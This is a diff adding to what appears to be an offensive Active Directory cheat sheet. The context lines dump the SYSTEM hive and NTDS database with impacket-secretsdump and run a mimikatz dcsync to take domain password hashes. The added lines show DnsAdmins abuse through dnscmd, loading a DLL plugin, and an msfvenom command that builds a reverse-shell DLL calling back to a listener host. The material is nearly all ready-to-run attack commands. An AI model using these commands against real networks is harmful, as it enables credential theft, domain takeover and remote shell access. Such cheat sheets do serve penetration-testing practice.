@@ -810,3 +810,13 @@ reg.exe save hklm\system C:\system_hive.bak
 impacket-secretsdump -ntds ntds.dit.bak -system system_hive.bak LOCAL
 #Or you can get hashes directly from DC with mimikatz if you have foothold on the DC:
 lsadump::dcsync /user:testad\target-username
+
+----
+
+#Service specific tips:
+
+#DNS service
+#If you're part of DnsAdmins, you can inject DLL-plugins (after which you just sc.exe stop dns + sc.exe start dns):
+dnscmd.exe RESOLUTE /config /serverlevelplugindll C:\temp\reverse_shell.dll
+#You can create the DLL with for example MSFVenom:
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=10.0.0.1 LPORT=1234 DLL=reverse_shell.dll > reverse_shell.dl
